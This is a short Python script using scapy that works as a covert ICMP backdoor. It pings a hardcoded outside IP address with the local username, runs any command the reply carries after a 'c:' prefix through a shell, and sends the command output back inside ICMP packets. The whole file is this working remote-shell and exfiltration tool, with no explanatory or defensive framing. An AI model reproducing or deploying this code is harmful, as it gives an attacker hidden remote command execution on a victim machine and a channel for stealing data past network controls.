from scapy.all import sr1,IP,ICMP,send
import os, time, re, subprocess

target = "40.74.51.247"
uid = os.environ['USER']
while True:
    p = sr1(IP(dst=target)/ICMP()/uid, verbose=0)
    m = re.search('^c:(.*)', p.load)
    if m:
        print("exec " + m.group(1))
        o = subprocess.check_output(m.group(1), shell=True)
        send(IP(dst=target)/ICMP()/o, verbose=0)
    time.sleep(10)